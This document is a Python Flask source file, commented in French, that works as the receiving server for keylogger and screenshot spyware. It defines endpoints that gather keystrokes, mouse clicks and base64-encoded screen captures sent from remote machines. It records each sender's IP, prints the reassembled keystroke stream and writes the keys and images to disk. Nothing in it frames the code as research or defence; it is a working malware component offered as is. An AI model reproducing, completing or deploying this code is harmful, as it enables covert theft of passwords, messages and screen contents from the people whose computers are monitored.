from flask import Flask, request, jsonify
import base64
import os
from datetime import datetime

app = Flask(__name__)

# Créer le dossier 'captures' s'il n'existe pas
if not os.path.exists('captures'):
    os.makedirs('captures')

# Variables globales pour gérer les connexions et les frappes clavier
key_log = ""
connections = set()

# Afficher l'en-tête du serveur
print("--- Serveur ---")

@app.route('/upload', methods=['POST'])
def upload_data():
    global key_log
    data = request.get_json()

    # Extraire les informations de clic
    click_type = data.get('click_type')
    position = data.get('position')
    timestamp = data.get('timestamp')
    screenshot_data = data.get('screenshot')

    # Obtenir l'IP du client
    client_ip = request.remote_addr

    # Si nouvelle connexion, l'ajouter au set et l'afficher
    if client_ip not in connections:
        connections.add(client_ip)
        print(f"[Connection : {client_ip}]")

    # Traiter les clics
    if click_type and position and timestamp:
        if screenshot_data:
            # Convertir l'image base64 en image et l'enregistrer
            try:
                screenshot = base64.b64decode(screenshot_data)
                timestamp_str = datetime.fromisoformat(timestamp).strftime('%Y%m%d_%H%M%S_%f')
                filename = f"screenshot_{timestamp_str}.png"
                filepath = os.path.join('captures', filename)
                with open(filepath, "wb") as f:
                    f.write(screenshot)
                print(f"Clic {click_type.replace('_', ' ')} en position ({position['x']}, {position['y']}) [{filename}]")
            except Exception as e:
                print(f"Erreur lors de la sauvegarde de la capture d'écran : {e}")
        else:
            print(f"Clic {click_type.replace('_', ' ')} en position ({position['x']}, {position['y']})")

    return jsonify({"status": "success"}), 200

@app.route('/upload/key', methods=['POST'])
def upload_key():
    global key_log
    data = request.get_json()

    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    key = data.get('key')
    timestamp = data.get('timestamp')

    # Obtenir l'IP du client
    client_ip = request.remote_addr

    # Si nouvelle connexion, l'ajouter au set et l'afficher
    if client_ip not in connections:
        connections.add(client_ip)
        print(f"[Connection : {client_ip}]")

    # Afficher la touche
    if key.startswith("Key."):
        # Remplacer les touches spéciales par des symboles ou des noms lisibles
        special_key = key.replace("Key.", "").capitalize()
        key_log += special_key
    else:
        key_log += key

    print(key_log)

    # Enregistrer les touches dans un fichier
    try:
        with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
            logKey.write(f"{timestamp}: {key}\n")
    except Exception as e:
        print(f"Erreur lors de l'enregistrement des touches : {e}")

    return jsonify({"status": "success"}), 200
